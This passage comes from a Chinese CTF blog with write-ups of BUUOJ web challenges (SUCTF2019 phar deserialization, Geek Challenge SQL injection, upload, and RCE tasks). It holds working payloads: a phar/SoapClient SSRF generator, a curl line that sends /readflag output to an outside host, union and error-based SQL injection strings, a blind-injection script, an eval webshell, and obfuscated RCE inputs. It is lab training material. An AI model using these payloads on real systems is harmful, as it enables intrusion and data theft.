<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; class.php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line"></span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line">    public $type;</span><br><span class="line">    public $func &#x3D; &quot;Check&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name &#x3D; $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $class &#x3D; new ReflectionClass($this-&gt;func);</span><br><span class="line">        $a &#x3D; $class-&gt;newInstanceArgs($this-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getMIME()&#123;</span><br><span class="line">        $finfo &#x3D; finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $this-&gt;type &#x3D; finfo_file($finfo, $this-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return $this-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Check&#123;</span><br><span class="line"></span><br><span class="line">    public $file_name;</span><br><span class="line"></span><br><span class="line">    function __construct($file_name)&#123;</span><br><span class="line">        $this-&gt;file_name &#x3D; $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check()&#123;</span><br><span class="line">        $data &#x3D; file_get_contents($this-&gt;file_name);</span><br><span class="line">        if (mb_strpos($data, &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">            die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;不能包含&lt;?</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/media/media_mimeref.asp" target="_blank" rel="noopener">关于MME类型文件</a>   上传的文件要绕过Check::check()</p>
<p>finfo_file会触发phar的反序列化<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">参考文章1</a>     <a href="https://xz.aliyun.com/t/2958" target="_blank" rel="noopener">参考文章2</a></p>
<p>传入成功后url</p>
<p>phar://开头被正则过滤，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>生成phar文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File &#123;</span><br><span class="line">    public $file_name &#x3D; &quot;&quot;;</span><br><span class="line">    public $func &#x3D; &quot;SoapClient&quot;;</span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php&quot;;</span><br><span class="line">        $post_string &#x3D; &#39;admin&#x3D;1&amp;cmd&#x3D;curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; --insecure &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;dzWPkK&quot;&amp;clazz&#x3D;SplStack&amp;func1&#x3D;push&amp;func2&#x3D;push&amp;func3&#x3D;push&amp;arg1&#x3D;123456&amp;arg2&#x3D;123456&amp;arg3&#x3D;&#39;. &quot;\r\n&quot;;</span><br><span class="line">        $headers &#x3D; [];</span><br><span class="line">        $this-&gt;file_name  &#x3D; [</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, &#39;xxxxx^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string),</span><br><span class="line">                &#39;uri&#39;&#x3D;&gt;&#39;hello&#39;)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new File();</span><br><span class="line">$phar &#x3D; new Phar(&#39;poc.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a __HALT_COMPILER();&quot;);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将生成的poc.phar改一个图片文件后缀，然后上传</p>
<p>再func.php里面提交url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;upload&#x2F;2c67ca1eaeadbdc1868d67003072b481&#x2F;551ccbaef945b2c4f3ca88361f08d600.jpg</span><br></pre></td></tr></table></figure>

<p>关于构造SoapClient当中的cmd命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --referer &quot;&#96;&#x2F;readflag&#96;&quot; --insecure &quot;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api%26id&#x3D;dzWPkK&quot;</span><br></pre></td></tr></table></figure>

<p>因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值</p>
<p>附上出题人<a href="https://xz.aliyun.com/t/6057" target="_blank" rel="noopener">出题笔记</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>buuoj</tag>
        <tag>web</tag>
        <tag>suctf2019</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录10-极客大挑战web2</title>
    <url>/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web2/</url>
    <content><![CDATA[<h2 id="极客大挑战web"><a href="#极客大挑战web" class="headerlink" title="极客大挑战web"></a>极客大挑战web</h2><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误</p>
<p>常规操作</p>
<a id="more"></a>

<ol>
<li><h4 id="order-by判断字段，字段为3"><a href="#order-by判断字段，字段为3" class="headerlink" title="order by判断字段，字段为3"></a>order by判断字段，字段为3</h4></li>
</ol>
<p><img src="../pic/38.png" alt=""></p>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code></p>
<p><img src="../pic/39.png" alt=""></p>
<ol start="2">
<li><h4 id="union确定回显，回显位置为2，3"><a href="#union确定回显，回显位置为2，3" class="headerlink" title="union确定回显，回显位置为2，3"></a>union确定回显，回显位置为2，3</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,2,3+%23&amp;password=123</code></p>
<p><img src="../pic/40.png" alt=""></p>
<ol start="3">
<li><h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,database(),3+%23&amp;password=123</code></p>
<p><img src="../pic/41.png" alt=""></p>
<ol start="4">
<li><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;+%23&amp;password=123</code></p>
<p><img src="../pic/42.png" alt=""></p>
<p>l0ve1ysq1、geekuser</p>
<ol start="5">
<li><h4 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;l0ve1ysq1&#39;+%23&amp;password=123</code></p>
<p><img src="../pic/43.png" alt=""></p>
<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;geekuser&#39;+%23&amp;password=123</code></p>
<p><img src="../pic/44.png" alt=""></p>
<ol start="6">
<li><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4></li>
</ol>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+geekuser+limit+0,1+%23&amp;password=123</code></p>
<p>geekuser只有一个admin</p>
<p><img src="../pic/45.png" alt=""></p>
<p>l0ve1ysq1表中发现了flag</p>
<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code> </p>
<p><img src="../pic/46.png" alt=""></p>
<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>fuzzing一下，将union,select,and,or,where,from删除</p>
<p>此时可以selselectect将select删除之后就变成了sel <del>select</del> ect</p>
<p>因为和上面的一样，直接查询数据库</p>
<ol>
<li><h4 id="查数据库-1"><a href="#查数据库-1" class="headerlink" title="查数据库"></a>查数据库</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,database(),3--+&amp;password=123</code></p>
<p>数据库名还是geek</p>
<ol start="2">
<li><h4 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h4></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;&#39;uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema&#x3D;&#39;geek&#39;--+&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>

<p>b4bsql,geekuser</p>
<ol start="3">
<li><h4 id="查列名-1"><a href="#查列名-1" class="headerlink" title="查列名"></a>查列名</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema=&#39;geek&#39;+anandd+table_name=&#39;b4bsql&#39;--+&amp;password=123</code></p>
<p>列名还是id,username,password</p>
<ol start="4">
<li><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4></li>
</ol>
<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&amp;password=123</code></p>
<p><img src="../pic/47.png" alt=""></p>
<p>成功拿到flag</p>
<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>打开BP，开启拦截，查看site map发现有一个secret.php</p>
<p><img src="../pic/48.png" alt=""></p>
<p>访问即可</p>
<p>根据提示修改http头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:27400</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">X-Forwarded-for:127.0.0.1</span><br><span class="line">Accept-Language: en</span><br><span class="line">Referer:https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>点进去有一个payflag界面,</p>
<p>根据提示，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!! </span><br><span class="line"></span><br><span class="line">Only Cuit&#39;s students can buy the FLAG</span><br></pre></td></tr></table></figure>

<p>页面最后有一段注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>这一段注释是对输入的<code>password</code>作比较，输入的是404，且能绕过<code>is_numeric()</code>函数。</p>
<p>在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的</p>
<p><img src="../pic/49.png" alt=""></p>
<p>抓包发现有cookie, user=0，改成=1，变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Please input your password!!</span><br></pre></td></tr></table></figure>

<p>传入数据<code>password=404a&amp;money=999999999</code>，他说数据太长，只能传入八位。</p>
<p>之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过</p>
<p><code>password=404a&amp;money[]=</code></p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>上传PHP一句话被过滤</p>
<p><img src="../pic/50.png" alt=""></p>
<p>换成图片后缀jpg进行%00截断，还是被过滤</p>
<p><img src="../pic/51.png" alt=""></p>
<p>尝试php2,php3,php5都被过滤</p>
<p><img src="../pic/52.png" alt=""></p>
<p><img src="../pic/53.png" alt=""></p>
<p><img src="../pic/54.png" alt=""></p>
<p>只有phtml没有被过滤</p>
<p><img src="../pic/55.png" alt=""></p>
<p>内容不能出现<code>&lt;?</code>可以换成js的写法</p>
<p><img src="../pic/56.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">eval($_POST[&#39;cmd&#39;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>再上传提示必须是图片，添加gif文件头<code>GIF89a</code></p>
<p><img src="../pic/57.png" alt=""></p>
<p>使用蚁剑，菜刀连接，找到flag</p>
<p><img src="../pic/58.png" alt=""></p>
<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p>fuzz测试</p>
<p><code>AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&amp;&amp;,&lt;,&gt;,ascii,%20,%09</code>被过滤</p>
<p>输入错误还会报出sql语句错误，考虑报错注入</p>
<ol>
<li><h4 id="查数据库-2"><a href="#查数据库-2" class="headerlink" title="查数据库"></a>查数据库</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(database())),0))%23</code>还是geek</p>
</li>
<li><h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0))%23</code></p>
<p>H4rDsq1</p>
</li>
<li><h4 id="查列名（应该还是只有id-usname-password）"><a href="#查列名（应该还是只有id-usname-password）" class="headerlink" title="查列名（应该还是只有id,usname,password）"></a>查列名（应该还是只有id,usname,password）</h4></li>
<li><h4 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
<p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
<p>因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。</p>
</li>
</ol>
<h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p>fuzz之后发现被过滤的关键字有</p>
<p><img src="../pic/59.png" alt=""></p>
<p>题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框</p>
<p><img src="../pic/60.png" alt=""></p>
<p><img src="../pic/61.png" alt=""></p>
<p>根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注</p>
<p>编写盲注脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get(payload):</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(&#39;+payload+&#39;)&#39;</span><br><span class="line">    html &#x3D; requests.get(url)</span><br><span class="line">    # print(html)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len&#x3D;999):</span><br><span class="line">    result &#x3D; &#39;&#39;</span><br><span class="line">    x&#x3D;1</span><br><span class="line">    while x &lt;&#x3D; len :</span><br><span class="line">        error &#x3D; 0</span><br><span class="line">        left &#x3D; 0</span><br><span class="line">        right &#x3D; 126</span><br><span class="line">        while left &lt;&#x3D; right:</span><br><span class="line">            mid &#x3D; (left + right) &#x2F; 2</span><br><span class="line">            payload &#x3D; &quot;ascii(substr((%s),%d,1))&gt;%d&quot; % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res &#x3D; get(payload)</span><br><span class="line">            if res.status_code &#x3D;&#x3D; 404 or res.status_code &#x3D;&#x3D; 429:</span><br><span class="line">                x&#x3D;x-1</span><br><span class="line">                error &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">            html&#x3D;res.text</span><br><span class="line">            # print(&#39;*-*-*-*-*-*&#39;, mid)</span><br><span class="line">            if &#39;others&#39; in html:</span><br><span class="line">                left &#x3D; mid +1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid -1</span><br><span class="line">        mid &#x3D; int((left + right + 1) &#x2F; 2)</span><br><span class="line">        if mid &#x3D;&#x3D; 0 :</span><br><span class="line">            break</span><br><span class="line">        if error &#x3D;&#x3D; 0 :</span><br><span class="line">            result +&#x3D; chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x&#x3D;x+1</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload&#x3D;&#39;database()&#39;</span><br><span class="line">    database &#x3D; binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line">def get_tabls(db):</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;\&#39;&#39;+db+&#39;\&#39;)&#39;</span><br><span class="line">    tables&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_columns(table):</span><br><span class="line">    s_payload &#x3D; &#39;select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;\&#39;&#39;+table+&#39;\&#39;)&#39;</span><br><span class="line">    columns&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_data(columns,table):</span><br><span class="line">    s_payload&#x3D;&#39;select(group_concat(&#39;+columns+&#39;))from(&#39;+table+&#39;)&#39;</span><br><span class="line">    password&#x3D;binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database()</span><br><span class="line"></span><br><span class="line"># get_tabls(&#39;geek&#39;) #F1naI1y,Flaaaaag</span><br><span class="line">#</span><br><span class="line"># get_columns(&#39;F1naI1y&#39;) # id,username,password</span><br><span class="line"># get_columns(&#39;Flaaaaag&#39;) # id,fl4gawsl</span><br><span class="line"></span><br><span class="line"># get_data(&#39;fl4gawsl&#39;,&#39;Flaaaaag&#39;)</span><br><span class="line">get_data(&#39;id,username,password&#39;,&#39;F1naI1y&#39;)</span><br></pre></td></tr></table></figure>

<p>跑出来有两个表F1naI1y,Flaaaaag</p>
<p>F1naI1y表还是只有id,username,password</p>
<p>Flaaaaag表包括id,fl4gawsl</p>
<h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p>打开题目有源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">            $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;  </span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure>

<p> 传入一个code参数，长度不能大于40，不能包含大小写字母和数字</p>
<p>可以使用取反或者异或拼凑函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~?&gt;);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;_&#x3D;phpinfo()&amp;__&#x3D;assert</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%A0%AF%B0%AC%AB是_GET的取反的值，$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;)&#96;就相当于 $_GET&#123;&#39;__&#39;&#125;($_GET&#123;&#39;_&#39;&#125;)   联合起来就是assert(phpinfo())</span><br></pre></td></tr></table></figure>



<p>关于assert函数**</p>
<p>PHP 5 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</p>
<p>PHP 7 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</p>
<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <strong><code>FALSE</code></strong> 时采取适当的行动。</p>
<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a href="https://www.php.net/manual/zh/function.assert-options.php" target="_blank" rel="noopener">assert_options()</a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>
<p><img src="../pic/64.png" alt=""></p>
<p>先查看phpinfo()</p>
<p><img src="../pic/62.png" alt=""></p>
<p>禁用了很多执行系统命令的函数</p>
<p><img src="../pic/63.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>

<p>扫描当前目录 </p>
<p>post 数据： <code>_=print_r(scandir(%27./%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array (    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>

<p>扫描根目录</p>
<p>post数据：<code>_=print_r(scandir(%27/%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var )</span><br></pre></td></tr></table></figure>

<p>发现有一个flag文件和一个readflag文件。尝试读取内容</p>
<p>读取flag中的文件是空的；</p>
<p>post数据：<code>_=var_dump(file_get_contents(%27/flag%27))&amp;__=assert</code></p>
<p>post数据：<code>_=var_dump(file_get_contents(%27/readflag%27))&amp;__=assert</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(8856) &quot;ELF&gt;�@�@8 @@@@��888  � � � x� � � � ��TTTDDP�td���&lt;&lt;Q�tdR�td� � � ((&#x2F;lib64&#x2F;ld-linux-x86-64.so.2GNU GNU�íf­CI�&#96;[Xa���V�Q ?m 8| � )&quot;!libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5ui �� �� &#96;H H � � � � � �     ( 0  8 H��H�� H��t��H����5� �%� @�%� h������%� h������%� h������%� h�����%� h�����%b f�1�I��^H��H���PTL��H� sH�&#x3D;� �DH�&#x3D;y H�y UH)�H��H��vH�� H��t ]��fD]�@f.�H�&#x3D;9 H�52 UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��&#x3D;� u&#39;H�&#x3D;� UH��tH�&#x3D;� � ����H���]�� ��@f.�H�&#x3D;A H�?u�^���fDH�) H��t�UH����]�@���UH����������~������_������@���H�&#x3D;�������]�f.�f�AWAVA��AUATL�%� UH�-� SI��I��L)�H��H������H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���&#x2F;bin&#x2F;cat &#x2F;flag;8l�������������T����l��������,zRx�����+zRx�$����&#96;FJw�?;*3$&quot;D���\@���TA�C OD|����eB�B�E �B(�H0�H8�M@r8A0A(B BBB������&#96; �� � ���o��� � x��� ���o���o����o���o����o� FVfv�H GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 201705168Tt����� � �0 ����� � � � � �  @ P ��� �.&#96;DP S� z��� ������ �� ���� �� �� ��  �0 � @ LP *�Sg�@ � �H ���0e�X ��+�P ��T�� P  -A&quot;�]rcrtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment88#TT 1tt$D���o��N�� V���^���o��k���o�� z����B��x��00&#96;��������� ������&lt;� �� � �� � �� � �� � ��� �0� @�@ @�P P0P-��&#x2F; @��&quot;</span><br></pre></td></tr></table></figure>

<p>是linux可执文件</p>
<p>连接蚁剑 payload :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;cmd&#39;])</span><br></pre></td></tr></table></figure>

<p>应该是要绕过disable_function,从而执行readflag，项目地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOAD</span><br></pre></td></tr></table></figure>

<p>只有/tmp有文件修改权限，上传<code>bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so</code>到/tmp下</p>
